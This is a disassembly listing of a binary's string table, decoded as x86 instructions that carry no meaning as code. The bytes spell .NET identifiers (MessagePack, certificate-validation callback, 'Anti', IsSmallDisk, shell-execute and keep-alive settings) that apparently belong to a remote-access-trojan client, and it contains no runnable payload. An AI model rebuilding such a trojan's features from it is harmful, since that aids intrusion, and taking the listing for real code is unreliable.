  4080f4:	65 00 44 65 6c       	add    %al,%gs:0x6c(%ebp,%eiz,2)
  4080f9:	65 74 65             	gs je  0x408161
  4080fc:	00 43 61             	add    %al,0x61(%ebx)
  4080ff:	6c                   	insb   (%dx),%es:(%edi)
  408100:	6c                   	insb   (%dx),%es:(%edi)
  408101:	53                   	push   %ebx
  408102:	69 74 65 00 57 72 69 	imul   $0x74697257,0x0(%ebp,%eiz,2),%esi
  408109:	74 
  40810a:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  40810e:	6d                   	insl   (%dx),%es:(%edi)
  40810f:	70 69                	jo     0x40817a
  408111:	6c                   	insb   (%dx),%es:(%edi)
  408112:	65 72 47             	gs jb  0x40815c
  408115:	65 6e                	outsb  %gs:(%esi),(%dx)
  408117:	65 72 61             	gs jb  0x40817b
  40811a:	74 65                	je     0x408181
  40811c:	64 41                	fs inc %ecx
  40811e:	74 74                	je     0x408194
  408120:	72 69                	jb     0x40818b
  408122:	62 75 74             	bound  %esi,0x74(%ebp)
  408125:	65 00 44 65 62       	add    %al,%gs:0x62(%ebp,%eiz,2)
  40812a:	75 67                	jne    0x408193
  40812c:	67 61                	addr16 popa
  40812e:	62 6c 65 41          	bound  %ebp,0x41(%ebp,%eiz,2)
  408132:	74 74                	je     0x4081a8
  408134:	72 69                	jb     0x40819f
  408136:	62 75 74             	bound  %esi,0x74(%ebp)
  408139:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  40813d:	6d                   	insl   (%dx),%es:(%edi)
  40813e:	56                   	push   %esi
  40813f:	69 73 69 62 6c 65 41 	imul   $0x41656c62,0x69(%ebx),%esi
  408146:	74 74                	je     0x4081bc
  408148:	72 69                	jb     0x4081b3
  40814a:	62 75 74             	bound  %esi,0x74(%ebp)
  40814d:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  408151:	73 65                	jae    0x4081b8
  408153:	6d                   	insl   (%dx),%es:(%edi)
  408154:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  408158:	69 74 6c 65 41 74 74 	imul   $0x72747441,0x65(%esp,%ebp,2),%esi
  40815f:	72 
  408160:	69 62 75 74 65 00 41 	imul   $0x41006574,0x75(%edx),%esp
  408167:	73 73                	jae    0x4081dc
  408169:	65 6d                	gs insl (%dx),%es:(%edi)
  40816b:	62 6c 79 54          	bound  %ebp,0x54(%ecx,%edi,2)
  40816f:	72 61                	jb     0x4081d2
  408171:	64 65 6d             	fs gs insl (%dx),%es:(%edi)
  408174:	61                   	popa
  408175:	72 6b                	jb     0x4081e2
  408177:	41                   	inc    %ecx
  408178:	74 74                	je     0x4081ee
  40817a:	72 69                	jb     0x4081e5
  40817c:	62 75 74             	bound  %esi,0x74(%ebp)
  40817f:	65 00 54 61 72       	add    %dl,%gs:0x72(%ecx,%eiz,2)
  408184:	67 65 74 46          	addr16 gs je 0x4081ce
  408188:	72 61                	jb     0x4081eb
  40818a:	6d                   	insl   (%dx),%es:(%edi)
  40818b:	65 77 6f             	gs ja  0x4081fd
  40818e:	72 6b                	jb     0x4081fb
  408190:	41                   	inc    %ecx
  408191:	74 74                	je     0x408207
  408193:	72 69                	jb     0x4081fe
  408195:	62 75 74             	bound  %esi,0x74(%ebp)
  408198:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  40819c:	73 65                	jae    0x408203
  40819e:	6d                   	insl   (%dx),%es:(%edi)
  40819f:	62 6c 79 46          	bound  %ebp,0x46(%ecx,%edi,2)
  4081a3:	69 6c 65 56 65 72 73 	imul   $0x69737265,0x56(%ebp,%eiz,2),%ebp
  4081aa:	69 
  4081ab:	6f                   	outsl  %ds:(%esi),(%dx)
  4081ac:	6e                   	outsb  %ds:(%esi),(%dx)
  4081ad:	41                   	inc    %ecx
  4081ae:	74 74                	je     0x408224
  4081b0:	72 69                	jb     0x40821b
  4081b2:	62 75 74             	bound  %esi,0x74(%ebp)
  4081b5:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4081b9:	73 65                	jae    0x408220
  4081bb:	6d                   	insl   (%dx),%es:(%edi)
  4081bc:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  4081c0:	6f                   	outsl  %ds:(%esi),(%dx)
  4081c1:	6e                   	outsb  %ds:(%esi),(%dx)
  4081c2:	66 69 67 75 72 61    	imul   $0x6172,0x75(%edi),%sp
  4081c8:	74 69                	je     0x408233
  4081ca:	6f                   	outsl  %ds:(%esi),(%dx)
  4081cb:	6e                   	outsb  %ds:(%esi),(%dx)
  4081cc:	41                   	inc    %ecx
  4081cd:	74 74                	je     0x408243
  4081cf:	72 69                	jb     0x40823a
  4081d1:	62 75 74             	bound  %esi,0x74(%ebp)
  4081d4:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  4081d8:	73 65                	jae    0x40823f
  4081da:	6d                   	insl   (%dx),%es:(%edi)
  4081db:	62 6c 79 44          	bound  %ebp,0x44(%ecx,%edi,2)
  4081df:	65 73 63             	gs jae 0x408245
  4081e2:	72 69                	jb     0x40824d
  4081e4:	70 74                	jo     0x40825a
  4081e6:	69 6f 6e 41 74 74 72 	imul   $0x72747441,0x6e(%edi),%ebp
  4081ed:	69 62 75 74 65 00 44 	imul   $0x44006574,0x75(%edx),%esp
  4081f4:	65 66 61             	gs popaw
  4081f7:	75 6c                	jne    0x408265
  4081f9:	74 4d                	je     0x408248
  4081fb:	65 6d                	gs insl (%dx),%es:(%edi)
  4081fd:	62 65 72             	bound  %esp,0x72(%ebp)
  408200:	41                   	inc    %ecx
  408201:	74 74                	je     0x408277
  408203:	72 69                	jb     0x40826e
  408205:	62 75 74             	bound  %esi,0x74(%ebp)
  408208:	65 00 43 6f          	add    %al,%gs:0x6f(%ebx)
  40820c:	6d                   	insl   (%dx),%es:(%edi)
  40820d:	70 69                	jo     0x408278
  40820f:	6c                   	insb   (%dx),%es:(%edi)
  408210:	61                   	popa
  408211:	74 69                	je     0x40827c
  408213:	6f                   	outsl  %ds:(%esi),(%dx)
  408214:	6e                   	outsb  %ds:(%esi),(%dx)
  408215:	52                   	push   %edx
  408216:	65 6c                	gs insb (%dx),%es:(%edi)
  408218:	61                   	popa
  408219:	78 61                	js     0x40827c
  40821b:	74 69                	je     0x408286
  40821d:	6f                   	outsl  %ds:(%esi),(%dx)
  40821e:	6e                   	outsb  %ds:(%esi),(%dx)
  40821f:	73 41                	jae    0x408262
  408221:	74 74                	je     0x408297
  408223:	72 69                	jb     0x40828e
  408225:	62 75 74             	bound  %esi,0x74(%ebp)
  408228:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  40822c:	73 65                	jae    0x408293
  40822e:	6d                   	insl   (%dx),%es:(%edi)
  40822f:	62 6c 79 50          	bound  %ebp,0x50(%ecx,%edi,2)
  408233:	72 6f                	jb     0x4082a4
  408235:	64 75 63             	fs jne 0x40829b
  408238:	74 41                	je     0x40827b
  40823a:	74 74                	je     0x4082b0
  40823c:	72 69                	jb     0x4082a7
  40823e:	62 75 74             	bound  %esi,0x74(%ebp)
  408241:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  408245:	73 65                	jae    0x4082ac
  408247:	6d                   	insl   (%dx),%es:(%edi)
  408248:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  40824c:	6f                   	outsl  %ds:(%esi),(%dx)
  40824d:	70 79                	jo     0x4082c8
  40824f:	72 69                	jb     0x4082ba
  408251:	67 68 74 41 74 74    	addr16 push $0x74744174
  408257:	72 69                	jb     0x4082c2
  408259:	62 75 74             	bound  %esi,0x74(%ebp)
  40825c:	65 00 41 73          	add    %al,%gs:0x73(%ecx)
  408260:	73 65                	jae    0x4082c7
  408262:	6d                   	insl   (%dx),%es:(%edi)
  408263:	62 6c 79 43          	bound  %ebp,0x43(%ecx,%edi,2)
  408267:	6f                   	outsl  %ds:(%esi),(%dx)
  408268:	6d                   	insl   (%dx),%es:(%edi)
  408269:	70 61                	jo     0x4082cc
  40826b:	6e                   	outsb  %ds:(%esi),(%dx)
  40826c:	79 41                	jns    0x4082af
  40826e:	74 74                	je     0x4082e4
  408270:	72 69                	jb     0x4082db
  408272:	62 75 74             	bound  %esi,0x74(%ebp)
  408275:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  408279:	6e                   	outsb  %ds:(%esi),(%dx)
  40827a:	74 69                	je     0x4082e5
  40827c:	6d                   	insl   (%dx),%es:(%edi)
  40827d:	65 43                	gs inc %ebx
  40827f:	6f                   	outsl  %ds:(%esi),(%dx)
  408280:	6d                   	insl   (%dx),%es:(%edi)
  408281:	70 61                	jo     0x4082e4
  408283:	74 69                	je     0x4082ee
  408285:	62 69 6c             	bound  %ebp,0x6c(%ecx)
  408288:	69 74 79 41 74 74 72 	imul   $0x69727474,0x41(%ecx,%edi,2),%esi
  40828f:	69 
  408290:	62 75 74             	bound  %esi,0x74(%ebp)
  408293:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  408297:	74 5f                	je     0x4082f8
  408299:	55                   	push   %ebp
  40829a:	73 65                	jae    0x408301
  40829c:	53                   	push   %ebx
  40829d:	68 65 6c 6c 45       	push   $0x456c6c65
  4082a2:	78 65                	js     0x408309
  4082a4:	63 75 74             	arpl   %esi,0x74(%ebp)
  4082a7:	65 00 52 65          	add    %dl,%gs:0x65(%edx)
  4082ab:	61                   	popa
  4082ac:	64 42                	fs inc %edx
  4082ae:	79 74                	jns    0x408324
  4082b0:	65 00 57 72          	add    %dl,%gs:0x72(%edi)
  4082b4:	69 74 65 42 79 74 65 	imul   $0x657479,0x42(%ebp,%eiz,2),%esi
  4082bb:	00 
  4082bc:	44                   	inc    %esp
  4082bd:	65 6c                	gs insb (%dx),%es:(%edi)
  4082bf:	65 74 65             	gs je  0x408327
  4082c2:	56                   	push   %esi
  4082c3:	61                   	popa
  4082c4:	6c                   	insb   (%dx),%es:(%edi)
  4082c5:	75 65                	jne    0x40832c
  4082c7:	00 69 6e             	add    %ch,0x6e(%ecx)
  4082ca:	6e                   	outsb  %ds:(%esi),(%dx)
  4082cb:	65 72 56             	gs jb  0x408324
  4082ce:	61                   	popa
  4082cf:	6c                   	insb   (%dx),%es:(%edi)
  4082d0:	75 65                	jne    0x408337
  4082d2:	00 47 65             	add    %al,0x65(%edi)
  4082d5:	74 56                	je     0x40832d
  4082d7:	61                   	popa
  4082d8:	6c                   	insb   (%dx),%es:(%edi)
  4082d9:	75 65                	jne    0x408340
  4082db:	00 53 65             	add    %dl,0x65(%ebx)
  4082de:	74 56                	je     0x408336
  4082e0:	61                   	popa
  4082e1:	6c                   	insb   (%dx),%es:(%edi)
  4082e2:	75 65                	jne    0x408349
  4082e4:	00 76 61             	add    %dh,0x61(%esi)
  4082e7:	6c                   	insb   (%dx),%es:(%edi)
  4082e8:	75 65                	jne    0x40834f
  4082ea:	00 67 65             	add    %ah,0x65(%edi)
  4082ed:	74 5f                	je     0x40834e
  4082ef:	4b                   	dec    %ebx
  4082f0:	65 65 70 41          	gs gs jo 0x408335
  4082f4:	6c                   	insb   (%dx),%es:(%edi)
  4082f5:	69 76 65 00 73 65 74 	imul   $0x74657300,0x65(%esi),%esi
  4082fc:	5f                   	pop    %edi
  4082fd:	4b                   	dec    %ebx
  4082fe:	65 65 70 41          	gs gs jo 0x408343
  408302:	6c                   	insb   (%dx),%es:(%edi)
  408303:	69 76 65 00 52 65 6d 	imul   $0x6d655200,0x65(%esi),%esi
  40830a:	6f                   	outsl  %ds:(%esi),(%dx)
  40830b:	76 65                	jbe    0x408372
  40830d:	00 53 54             	add    %dl,0x54(%ebx)
  408310:	75 2e                	jne    0x408340
  408312:	65 78 65             	gs js  0x40837a
  408315:	00 73 65             	add    %dh,0x65(%ebx)
  408318:	74 5f                	je     0x408379
  40831a:	42                   	inc    %edx
  40831b:	6c                   	insb   (%dx),%es:(%edi)
  40831c:	6f                   	outsl  %ds:(%esi),(%dx)
  40831d:	63 6b 53             	arpl   %ebp,0x53(%ebx)
  408320:	69 7a 65 00 67 65 74 	imul   $0x74656700,0x65(%edx),%edi
  408327:	5f                   	pop    %edi
  408328:	54                   	push   %esp
  408329:	6f                   	outsl  %ds:(%esi),(%dx)
  40832a:	74 61                	je     0x40838d
  40832c:	6c                   	insb   (%dx),%es:(%edi)
  40832d:	53                   	push   %ebx
  40832e:	69 7a 65 00 67 65 74 	imul   $0x74656700,0x65(%edx),%edi
  408335:	5f                   	pop    %edi
  408336:	48                   	dec    %eax
  408337:	65 61                	gs popa
  408339:	64 65 72 53          	fs gs jb 0x408390
  40833d:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  408344:	5f                   	pop    %edi
  408345:	48                   	dec    %eax
  408346:	65 61                	gs popa
  408348:	64 65 72 53          	fs gs jb 0x40839f
  40834c:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  408353:	5f                   	pop    %edi
  408354:	53                   	push   %ebx
  408355:	65 6e                	outsb  %gs:(%esi),(%dx)
  408357:	64 42                	fs inc %edx
  408359:	75 66                	jne    0x4083c1
  40835b:	66 65 72 53          	data16 gs jb 0x4083b2
  40835f:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  408366:	5f                   	pop    %edi
  408367:	52                   	push   %edx
  408368:	65 63 65 69          	arpl   %esp,%gs:0x69(%ebp)
  40836c:	76 65                	jbe    0x4083d3
  40836e:	42                   	inc    %edx
  40836f:	75 66                	jne    0x4083d7
  408371:	66 65 72 53          	data16 gs jb 0x4083c8
  408375:	69 7a 65 00 73 65 74 	imul   $0x74657300,0x65(%edx),%edi
  40837c:	5f                   	pop    %edi
  40837d:	4b                   	dec    %ebx
  40837e:	65 79 53             	gs jns 0x4083d4
  408381:	69 7a 65 00 49 6e 64 	imul   $0x646e4900,0x65(%edx),%edi
  408388:	65 78 4f             	gs js  0x4083da
  40838b:	66 00 73 74          	data16 add %dh,0x74(%ebx)
  40838f:	72 46                	jb     0x4083d7
  408391:	6c                   	insb   (%dx),%es:(%edi)
  408392:	61                   	popa
  408393:	67 00 43 72          	add    %al,0x72(%bp,%di)
  408397:	79 70                	jns    0x408409
  408399:	74 6f                	je     0x40840a
  40839b:	43                   	inc    %ebx
  40839c:	6f                   	outsl  %ds:(%esi),(%dx)
  40839d:	6e                   	outsb  %ds:(%esi),(%dx)
  40839e:	66 69 67 00 67 65    	imul   $0x6567,0x0(%edi),%sp
  4083a4:	74 5f                	je     0x408405
  4083a6:	50                   	push   %eax
  4083a7:	69 6e 67 00 73 65 74 	imul   $0x74657300,0x67(%esi),%ebp
  4083ae:	5f                   	pop    %edi
  4083af:	50                   	push   %eax
  4083b0:	69 6e 67 00 53 79 73 	imul   $0x73795300,0x67(%esi),%ebp
  4083b7:	74 65                	je     0x40841e
  4083b9:	6d                   	insl   (%dx),%es:(%edi)
  4083ba:	2e 54                	cs push %esp
  4083bc:	68 72 65 61 64       	push   $0x64616572
  4083c1:	69 6e 67 00 73 65 74 	imul   $0x74657300,0x67(%esi),%ebp
  4083c8:	5f                   	pop    %edi
  4083c9:	50                   	push   %eax
  4083ca:	61                   	popa
  4083cb:	64 64 69 6e 67 00 61 	fs imul $0x64646100,%fs:0x67(%esi),%ebp
  4083d2:	64 64 
  4083d4:	5f                   	pop    %edi
  4083d5:	53                   	push   %ebx
  4083d6:	65 73 73             	gs jae 0x40844c
  4083d9:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  4083e0:	6e                   	outsb  %ds:(%esi),(%dx)
  4083e1:	67 00 53 79          	add    %dl,0x79(%bp,%di)
  4083e5:	73 74                	jae    0x40845b
  4083e7:	65 6d                	gs insl (%dx),%es:(%edi)
  4083e9:	45                   	inc    %ebp
  4083ea:	76 65                	jbe    0x408451
  4083ec:	6e                   	outsb  %ds:(%esi),(%dx)
  4083ed:	74 73                	je     0x408462
  4083ef:	5f                   	pop    %edi
  4083f0:	53                   	push   %ebx
  4083f1:	65 73 73             	gs jae 0x408467
  4083f4:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  4083fb:	6e                   	outsb  %ds:(%esi),(%dx)
  4083fc:	67 00 55 54          	add    %dl,0x54(%di)
  408400:	46                   	inc    %esi
  408401:	38 45 6e             	cmp    %al,0x6e(%ebp)
  408404:	63 6f 64             	arpl   %ebp,0x64(%edi)
  408407:	69 6e 67 00 53 79 73 	imul   $0x73795300,0x67(%esi),%ebp
  40840e:	74 65                	je     0x408475
  408410:	6d                   	insl   (%dx),%es:(%edi)
  408411:	2e 44                	cs inc %esp
  408413:	72 61                	jb     0x408476
  408415:	77 69                	ja     0x408480
  408417:	6e                   	outsb  %ds:(%esi),(%dx)
  408418:	67 2e 49             	addr16 cs dec %ecx
  40841b:	6d                   	insl   (%dx),%es:(%edi)
  40841c:	61                   	popa
  40841d:	67 69 6e 67 00 53 79 	imul   $0x73795300,0x67(%bp),%ebp
  408424:	73 
  408425:	74 65                	je     0x40848c
  408427:	6d                   	insl   (%dx),%es:(%edi)
  408428:	2e 52                	cs push %edx
  40842a:	75 6e                	jne    0x40849a
  40842c:	74 69                	je     0x408497
  40842e:	6d                   	insl   (%dx),%es:(%edi)
  40842f:	65 2e 56             	gs cs push %esi
  408432:	65 72 73             	gs jb  0x4084a8
  408435:	69 6f 6e 69 6e 67 00 	imul   $0x676e69,0x6e(%edi),%ebp
  40843c:	46                   	inc    %esi
  40843d:	72 6f                	jb     0x4084ae
  40843f:	6d                   	insl   (%dx),%es:(%edi)
  408440:	42                   	inc    %edx
  408441:	61                   	popa
  408442:	73 65                	jae    0x4084a9
  408444:	36 34 53             	ss xor $0x53,%al
  408447:	74 72                	je     0x4084bb
  408449:	69 6e 67 00 54 6f 42 	imul   $0x426f5400,0x67(%esi),%ebp
  408450:	61                   	popa
  408451:	73 65                	jae    0x4084b8
  408453:	36 34 53             	ss xor $0x53,%al
  408456:	74 72                	je     0x4084ca
  408458:	69 6e 67 00 52 65 61 	imul   $0x61655200,0x67(%esi),%ebp
  40845f:	64 53                	fs push %ebx
  408461:	74 72                	je     0x4084d5
  408463:	69 6e 67 00 44 6f 77 	imul   $0x776f4400,0x67(%esi),%ebp
  40846a:	6e                   	outsb  %ds:(%esi),(%dx)
  40846b:	6c                   	insb   (%dx),%es:(%edi)
  40846c:	6f                   	outsl  %ds:(%esi),(%dx)
  40846d:	61                   	popa
  40846e:	64 53                	fs push %ebx
  408470:	74 72                	je     0x4084e4
  408472:	69 6e 67 00 57 72 69 	imul   $0x69725700,0x67(%esi),%ebp
  408479:	74 65                	je     0x4084e0
  40847b:	53                   	push   %ebx
  40847c:	74 72                	je     0x4084f0
  40847e:	69 6e 67 00 54 6f 53 	imul   $0x536f5400,0x67(%esi),%ebp
  408485:	74 72                	je     0x4084f9
  408487:	69 6e 67 00 67 65 74 	imul   $0x74656700,0x67(%esi),%ebp
  40848e:	5f                   	pop    %edi
  40848f:	41                   	inc    %ecx
  408490:	73 53                	jae    0x4084e5
  408492:	74 72                	je     0x408506
  408494:	69 6e 67 00 73 65 74 	imul   $0x74657300,0x67(%esi),%ebp
  40849b:	5f                   	pop    %edi
  40849c:	41                   	inc    %ecx
  40849d:	73 53                	jae    0x4084f2
  40849f:	74 72                	je     0x408513
  4084a1:	69 6e 67 00 42 79 74 	imul   $0x74794200,0x67(%esi),%ebp
  4084a8:	65 73 41             	gs jae 0x4084ec
  4084ab:	73 53                	jae    0x408500
  4084ad:	74 72                	je     0x408521
  4084af:	69 6e 67 00 47 65 74 	imul   $0x74654700,0x67(%esi),%ebp
  4084b6:	41                   	inc    %ecx
  4084b7:	73 53                	jae    0x40850c
  4084b9:	74 72                	je     0x40852d
  4084bb:	69 6e 67 00 53 65 74 	imul   $0x74655300,0x67(%esi),%ebp
  4084c2:	41                   	inc    %ecx
  4084c3:	73 53                	jae    0x408518
  4084c5:	74 72                	je     0x408539
  4084c7:	69 6e 67 00 47 65 74 	imul   $0x74654700,0x67(%esi),%ebp
  4084ce:	53                   	push   %ebx
  4084cf:	74 72                	je     0x408543
  4084d1:	69 6e 67 00 42 79 74 	imul   $0x74794200,0x67(%esi),%ebp
  4084d8:	65 73 41             	gs jae 0x40851c
  4084db:	73 48                	jae    0x408525
  4084dd:	65 78 53             	gs js  0x408533
  4084e0:	74 72                	je     0x408554
  4084e2:	69 6e 67 00 53 75 62 	imul   $0x62755300,0x67(%esi),%ebp
  4084e9:	73 74                	jae    0x40855f
  4084eb:	72 69                	jb     0x408556
  4084ed:	6e                   	outsb  %ds:(%esi),(%dx)
  4084ee:	67 00 53 79          	add    %dl,0x79(%bp,%di)
  4084f2:	73 74                	jae    0x408568
  4084f4:	65 6d                	gs insl (%dx),%es:(%edi)
  4084f6:	2e 44                	cs inc %esp
  4084f8:	72 61                	jb     0x40855b
  4084fa:	77 69                	ja     0x408565
  4084fc:	6e                   	outsb  %ds:(%esi),(%dx)
  4084fd:	67 00 67 65          	add    %ah,0x65(%bx)
  408501:	74 5f                	je     0x408562
  408503:	41                   	inc    %ecx
  408504:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  408508:	61                   	popa
  408509:	74 65                	je     0x408570
  40850b:	50                   	push   %eax
  40850c:	6f                   	outsl  %ds:(%esi),(%dx)
  40850d:	6e                   	outsb  %ds:(%esi),(%dx)
  40850e:	67 00 73 65          	add    %dh,0x65(%bp,%di)
  408512:	74 5f                	je     0x408573
  408514:	41                   	inc    %ecx
  408515:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  408519:	61                   	popa
  40851a:	74 65                	je     0x408581
  40851c:	50                   	push   %eax
  40851d:	6f                   	outsl  %ds:(%esi),(%dx)
  40851e:	6e                   	outsb  %ds:(%esi),(%dx)
  40851f:	67 00 73 65          	add    %dh,0x65(%bp,%di)
  408523:	74 5f                	je     0x408584
  408525:	45                   	inc    %ebp
  408526:	72 72                	jb     0x40859a
  408528:	6f                   	outsl  %ds:(%esi),(%dx)
  408529:	72 44                	jb     0x40856f
  40852b:	69 61 6c 6f 67 00 6d 	imul   $0x6d00676f,0x6c(%ecx),%esp
  408532:	73 67                	jae    0x40859b
  408534:	00 43 6f             	add    %al,0x6f(%ebx)
  408537:	6d                   	insl   (%dx),%es:(%edi)
  408538:	70 75                	jo     0x4085af
  40853a:	74 65                	je     0x4085a1
  40853c:	48                   	dec    %eax
  40853d:	61                   	popa
  40853e:	73 68                	jae    0x4085a8
  408540:	00 73 74             	add    %dh,0x74(%ebx)
  408543:	72 54                	jb     0x408599
  408545:	6f                   	outsl  %ds:(%esi),(%dx)
  408546:	48                   	dec    %eax
  408547:	61                   	popa
  408548:	73 68                	jae    0x4085b2
  40854a:	00 47 65             	add    %al,0x65(%edi)
  40854d:	74 48                	je     0x408597
  40854f:	61                   	popa
  408550:	73 68                	jae    0x4085ba
  408552:	00 56 65             	add    %dl,0x65(%esi)
  408555:	72 69                	jb     0x4085c0
  408557:	66 79 48             	data16 jns 0x4085a2
  40855a:	61                   	popa
  40855b:	73 68                	jae    0x4085c5
  40855d:	00 46 6c             	add    %al,0x6c(%esi)
  408560:	75 73                	jne    0x4085d5
  408562:	68 00 67 65 74       	push   $0x74656700
  408567:	5f                   	pop    %edi
  408568:	45                   	inc    %ebp
  408569:	78 65                	js     0x4085d0
  40856b:	63 75 74             	arpl   %esi,0x74(%ebp)
  40856e:	61                   	popa
  40856f:	62 6c 65 50          	bound  %ebp,0x50(%ebp,%eiz,2)
  408573:	61                   	popa
  408574:	74 68                	je     0x4085de
  408576:	00 47 65             	add    %al,0x65(%edi)
  408579:	74 54                	je     0x4085cf
  40857b:	65 6d                	gs insl (%dx),%es:(%edi)
  40857d:	70 50                	jo     0x4085cf
  40857f:	61                   	popa
  408580:	74 68                	je     0x4085ea
  408582:	00 70 61             	add    %dh,0x61(%eax)
  408585:	74 68                	je     0x4085ef
  408587:	00 48 6d             	add    %cl,0x6d(%eax)
  40858a:	61                   	popa
  40858b:	63 53 68             	arpl   %edx,0x68(%ebx)
  40858e:	61                   	popa
  40858f:	32 35 36 4c 65 6e    	xor    0x6e654c36,%dh
  408595:	67 74 68             	addr16 je 0x408600
  408598:	00 67 65             	add    %ah,0x65(%edi)
  40859b:	74 5f                	je     0x4085fc
  40859d:	4c                   	dec    %esp
  40859e:	65 6e                	outsb  %gs:(%esi),(%dx)
  4085a0:	67 74 68             	addr16 je 0x40860b
  4085a3:	00 49 76             	add    %cl,0x76(%ecx)
  4085a6:	4c                   	dec    %esp
  4085a7:	65 6e                	outsb  %gs:(%esi),(%dx)
  4085a9:	67 74 68             	addr16 je 0x408614
  4085ac:	00 41 75             	add    %al,0x75(%ecx)
  4085af:	74 68                	je     0x408619
  4085b1:	4b                   	dec    %ebx
  4085b2:	65 79 4c             	gs jns 0x408601
  4085b5:	65 6e                	outsb  %gs:(%esi),(%dx)
  4085b7:	67 74 68             	addr16 je 0x408622
  4085ba:	00 55 72             	add    %dl,0x72(%ebp)
  4085bd:	69 00 41 6e 74 69    	imul   $0x69746e41,(%eax),%eax
  4085c3:	00 6d 73             	add    %ch,0x73(%ebp)
  4085c6:	67 70 61             	addr16 jo 0x40862a
  4085c9:	63 6b 4f             	arpl   %ebp,0x4f(%ebx)
  4085cc:	62 6a 00             	bound  %ebp,0x0(%edx)
  4085cf:	6c                   	insb   (%dx),%es:(%edi)
  4085d0:	69 73 74 4f 62 6a 00 	imul   $0x6a624f,0x74(%ebx),%esi
  4085d7:	6f                   	outsl  %ds:(%esi),(%dx)
  4085d8:	62 6a 00             	bound  %ebp,0x0(%edx)
  4085db:	4d                   	dec    %ebp
  4085dc:	65 73 73             	gs jae 0x408652
  4085df:	61                   	popa
  4085e0:	67 65 50             	addr16 gs push %eax
  4085e3:	61                   	popa
  4085e4:	63 6b 4c             	arpl   %ebp,0x4c(%ebx)
  4085e7:	69 62 2e 4d 65 73 73 	imul   $0x7373654d,0x2e(%edx),%esp
  4085ee:	61                   	popa
  4085ef:	67 65 50             	addr16 gs push %eax
  4085f2:	61                   	popa
  4085f3:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  4085f6:	4d                   	dec    %ebp
  4085f7:	73 67                	jae    0x408660
  4085f9:	50                   	push   %eax
  4085fa:	61                   	popa
  4085fb:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  4085fe:	41                   	inc    %ecx
  4085ff:	73 79                	jae    0x40867a
  408601:	6e                   	outsb  %ds:(%esi),(%dx)
  408602:	63 43 61             	arpl   %eax,0x61(%ebx)
  408605:	6c                   	insb   (%dx),%es:(%edi)
  408606:	6c                   	insb   (%dx),%es:(%edi)
  408607:	62 61 63             	bound  %esp,0x63(%ecx)
  40860a:	6b 00 52             	imul   $0x52,(%eax),%eax
  40860d:	65 6d                	gs insl (%dx),%es:(%edi)
  40860f:	6f                   	outsl  %ds:(%esi),(%dx)
  408610:	74 65                	je     0x408677
  408612:	43                   	inc    %ebx
  408613:	65 72 74             	gs jb  0x40868a
  408616:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  40861d:	56                   	push   %esi
  40861e:	61                   	popa
  40861f:	6c                   	insb   (%dx),%es:(%edi)
  408620:	69 64 61 74 69 6f 6e 	imul   $0x436e6f69,0x74(%ecx,%eiz,2),%esp
  408627:	43 
  408628:	61                   	popa
  408629:	6c                   	insb   (%dx),%es:(%edi)
  40862a:	6c                   	insb   (%dx),%es:(%edi)
  40862b:	62 61 63             	bound  %esp,0x63(%ecx)
  40862e:	6b 00 54             	imul   $0x54,(%eax),%eax
  408631:	69 6d 65 72 43 61 6c 	imul   $0x6c614372,0x65(%ebp),%ebp
  408638:	6c                   	insb   (%dx),%es:(%edi)
  408639:	62 61 63             	bound  %esp,0x63(%ecx)
  40863c:	6b 00 75             	imul   $0x75,(%eax),%eax
  40863f:	6e                   	outsb  %ds:(%esi),(%dx)
  408640:	70 61                	jo     0x4086a3
  408642:	63 6b 5f             	arpl   %ebp,0x5f(%ebx)
  408645:	6d                   	insl   (%dx),%es:(%edi)
  408646:	73 67                	jae    0x4086af
  408648:	70 61                	jo     0x4086ab
  40864a:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  40864d:	52                   	push   %edx
  40864e:	65 67 69 73 74 72 79 	imul   $0x654b7972,%gs:0x74(%bp,%di),%esi
  408655:	4b 65 
  408657:	79 50                	jns    0x4086a9
  408659:	65 72 6d             	gs jb  0x4086c9
  40865c:	69 73 73 69 6f 6e 43 	imul   $0x436e6f69,0x73(%ebx),%esi
  408663:	68 65 63 6b 00       	push   $0x6b6365
  408668:	46                   	inc    %esi
  408669:	6c                   	insb   (%dx),%es:(%edi)
  40866a:	75 73                	jne    0x4086df
  40866c:	68 46 69 6e 61       	push   $0x616e6946
  408671:	6c                   	insb   (%dx),%es:(%edi)
  408672:	42                   	inc    %edx
  408673:	6c                   	insb   (%dx),%es:(%edi)
  408674:	6f                   	outsl  %ds:(%esi),(%dx)
  408675:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  408678:	49                   	dec    %ecx
  408679:	73 53                	jae    0x4086ce
  40867b:	6d                   	insl   (%dx),%es:(%edi)
  40867c:	61                   	popa
  40867d:	6c                   	insb   (%dx),%es:(%edi)
  40867e:	6c                   	insb   (%dx),%es:(%edi)
  40867f:	44                   	inc    %esp
  408680:	69 73 6b 00 62 56 61 	imul   $0x61566200,0x6b(%ebx),%esi
  408687:	6c                   	insb   (%dx),%es:(%edi)
  408688:	00 66 56             	add    %ah,0x56(%esi)
  40868b:	61                   	popa
  40868c:	6c                   	insb   (%dx),%es:(%edi)
  40868d:	00 69 56             	add    %ch,0x56(%ecx)
  408690:	61                   	popa
  408691:	6c                   	insb   (%dx),%es:(%edi)
